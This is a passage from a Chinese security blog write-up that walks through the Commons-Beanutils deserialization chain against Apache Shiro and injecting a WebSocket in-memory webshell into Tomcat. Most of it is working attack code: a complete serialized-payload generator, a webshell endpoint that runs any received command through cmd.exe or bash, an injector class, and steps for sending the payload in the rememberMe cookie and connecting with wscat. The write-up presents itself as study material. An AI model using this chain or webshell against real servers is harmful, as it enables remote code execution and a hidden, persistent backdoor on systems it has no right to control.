    getProperty:426, PropertyUtils (org.apache.commons.beanutils)
    compare:157, BeanComparator (org.apache.commons.beanutils)
    siftDownUsingComparator:721, PriorityQueue (java.util)
    siftDown:687, PriorityQueue (java.util)
    heapify:736, PriorityQueue (java.util)
    readObject:796, PriorityQueue (java.util)
    readObject:459, ObjectInputStream (java.io)
12、了解了整个CB链还不能使用，如何完成POC编写呢，需要一步一步来  
首先知道是通过 TemplatesImpl
加载恶意字节码，这里通过一个专门获取恶意类字节码的库javassist.ClassPool，获取了Evil恶意类字节码
13、然后创建BeanComparator对象。并且因为需要调用PriorityQueue.readObject，所以还需要创建PriorityQueue对象。前面了解了需要指定comparator为BeanComparator对象，找到这个构造方法，需要传递两个参数，一个为需要大于1的整型数字，一个为BeanComparator对象  
进一步完善POC
14、下一步，将恶意对象传入queue中，找到java.util.PriorityQueue#offer方法，将传入的对象赋值到queue数组中。
常见的是使用add()，与offer()是一样的，add()最后调用的也是offer()
15、将恶意对象offer进去之后，调用链已经基本完成了，反射指定property值即可。
执行成功弹出计算器
16、然后，不出意外的话，出意外了，前面说到，此时的利用链不能用CC了，但是当我们反射指定property值后，构造方法调用了CC中的类。
解决方法就是自己指定Comparator对象，找了3种方法，放在代码中了，P牛使用的是方法一  
17、完整的利用代码
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import org.apache.commons.beanutils.BeanComparator;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    import java.util.Collections;
    import java.util.Comparator;
    import java.util.PriorityQueue;
    public class CommonsBeanutils1Shiro {
        public byte[] getPayload(byte[] clazzBytes) throws Exception {
            TemplatesImpl obj = new TemplatesImpl();
            setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
            setFieldValue(obj, "_name", "HelloTemplatesImpl");
            setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
            //BeanComparator中引用了CC包中的ComparableComparator类
            //但是shiro中没有CC包，所以使用BeanComparator会报错，所以需要找到替换的类
            /*
                新的类需要满足以下条件：
                    1、实现 java.util.Comparator 接口
                    2、实现 java.io.Serializable 接口
                    3、Java、shiro或commons-beanutils自带，且兼容性强
             */
            //方法一：类 CaseInsensitiveComparator#Comparator
            //通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的 CaseInsensitiveComparator 对象，用它来实例化 BeanComparator
            final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
            //方法二：类Collections$ReverseComparator
            //通过反射获取类
            //需要转换类型为Comparator
    //        Class clazz = Class.forName("java.util.Collections$ReverseComparator");
    //        Constructor constructor = clazz.getDeclaredConstructor();
    //        constructor.setAccessible(true);
    //
    //        Comparator ob = (Comparator) constructor.newInstance();
    //        final BeanComparator comparator = new BeanComparator(null, ob);
            //方法三：类Collections$ReverseComparator
            //直接调用reverseOrder方法，返回的是一个ReverseComparator对象
    //        final BeanComparator comparator = new BeanComparator(null, Collections.reverseOrder());
            // BeanComparator comparator = new BeanComparator();
            PriorityQueue queue = new PriorityQueue(2, comparator);
            queue.add("1");
            queue.add("1");
            setFieldValue(comparator, "property", "outputProperties");
            setFieldValue(queue, "queue", new Object[]{obj, obj});
            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(barr);
            oos.writeObject(queue);
            oos.close();
            return barr.toByteArray();
        }
        public static void setFieldValue(Object obj, String fieldName, Object
                value) throws Exception {
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }
    }
利用CB1shiro，成功弹出计算器
## 0x04 注入WebSocket内存马
在攻防技术稳步提升的社会现状，相较于传统的将一句话木马上传到服务器上的落地文件getshell的方式，更多的是选择直接将内存马注入到中间件或组件中。shiro反序列化注入冰蝎内存马已经有现成的工具并且很适合实战使用了，后面发现Websocket内存马，不同于以往的直接将内存代码打入注册websocket服务。
### 生成WebSocket内存马
1、首先准备一个WebSocket_Cmd，在onMessage方法中放入命令执行代码。同理要注入websocket只需要改此处内容，详情可以看veo师傅的github项目。
    import org.apache.catalina.core.StandardContext;
    import org.apache.catalina.loader.WebappClassLoaderBase;
    import org.apache.tomcat.websocket.server.WsServerContainer;
    import javax.websocket.*;
    import javax.websocket.server.ServerContainer;
    import javax.websocket.server.ServerEndpointConfig;
    import java.io.InputStream;
    public class WebSocket_Cmd extends Endpoint implements MessageHandler.Whole {
        private Session session;
        public void onMessage(String message) {
            try {
                boolean iswin = System.getProperty("os.name").toLowerCase().startsWith("windows");
                Process exec;
                if (iswin) {
                    exec = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", message});
                } else {
                    exec = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", message});
                }
                InputStream ips = exec.getInputStream();
                StringBuilder sb = new StringBuilder();
                int i;
                while((i = ips.read()) != -1) {
                    sb.append((char)i);
                }
                ips.close();
                exec.waitFor();
                this.session.getBasicRemote().sendText(sb.toString());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        @Override
        public void onOpen(Session session, EndpointConfig config) {
            this.session = session;
            this.session.addMessageHandler(this);
        }
    }
2、将恶意类转换成字节数组
    import javassist.ClassPool;
    import javassist.CtClass;
    import java.util.Arrays;
    public class GetByteTools {
        public static void main(String[] args) throws Exception {
            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.get(WebSocket_Cmd.class.getName());
            byte[] payloads = clazz.toBytecode();
            System.out.println(Arrays.toString(payloads));
        }
    }
3、将获取到的字节数组加入到字节码处，生成内存马。因为要打TemplatesImap，所以继承了AbstractTranslet。
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    import org.apache.catalina.core.StandardContext;
    import org.apache.catalina.loader.WebappClassLoaderBase;
    import org.apache.catalina.webresources.StandardRoot;
    import org.apache.tomcat.websocket.server.WsServerContainer;
    import javax.websocket.DeploymentException;
    import javax.websocket.server.ServerContainer;
    import javax.websocket.server.ServerEndpointConfig;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    public class TemplatesImplWebSocket extends AbstractTranslet {
        static {
            try {
                String urlPath = "/ws";
                WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
                StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();
                if (standardroot == null){
                    Field field;
                    try {
                        field = webappClassLoaderBase.getClass().getDeclaredField("resources");
                        field.setAccessible(true);
                    }catch (Exception e){
                        field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
                        field.setAccessible(true);
                    }
                    standardroot = (StandardRoot)field.get(webappClassLoaderBase);
                }
                StandardContext standardContext = (StandardContext) standardroot.getContext();
                //以字节码方式 defineclass
                //字节数组通过 GetByteTools 获取
                ClassLoader cl = Thread.currentThread().getContextClassLoader();
                Class clazz;
                byte[] bytes = new byte[]{字节码};
                Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                method.setAccessible(true);
                clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
                //后面部分不变，build设置好的恶意类
                ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(clazz, urlPath).build();
                WsServerContainer container = (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());
                if (null == container.findMapping(urlPath)) {
                    try {
                        container.addEndpoint(configEndpoint);
                    } catch (DeploymentException e) {
                        e.printStackTrace();
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }
### 注入内存马
tomcat大小问题绕过参考洋洋师傅的文章：[绕过maxHttpHeaderSize](https://xz.aliyun.com/t/10696#toc-7)，我采用从POST请求体中发送字节码数据的方式进行绕过。  
1、生成MyTomcatClassLoader
将生成的payload放到rememberMe后
2、通过如下代码，获取websocket内存马的classData。具体路径一般在本项目下的targets目录
    import java.io.File;
    import java.io.FileInputStream;
    import java.net.URLEncoder;
    import java.util.Base64;
    public class getClassData {
        public static void main(String[] args) throws Exception {
            File file = new File("TemplatesImplWebSocket.class路径");
            FileInputStream inputFile = new FileInputStream(file);
            byte[] buffer = new byte[(int)file.length()];
            inputFile.read(buffer);
            inputFile.close();
            String base64Str = Base64.getEncoder().encodeToString(buffer);
            String urlStr = URLEncoder.encode(base64Str,"UTF-8");
            System.out.println("========ClassData========="+"\n");
            System.out.println(urlStr+"\n");
            System.out.println("========ClassData========="+"\n");
        }
    }
3、将生成的classData放入数据包的POST字段，发送数据包，注入内存马
4、使用wscat连接即可，路径在TemplatesImplWebSocket中设置的，为/ws
## 0x05 总结
学习反序列化和内存马已经很长一段时间了，看网上的文章也总是发现这样的问题，一个是JAVA基础欠缺，在反序列化部分很多底层知识还理解的很浅显；第二是有些复杂的地方，文章中一笔带过了，自己也一笔带过了。但是是能够体会到自己的成长的，一开始只会使用Ysoserial工具，shiro反序列化工具，JNDI注入工具，到现在，能够理解它大体的原理，现在想来，是挺开心的一件事。
## 0x06 参考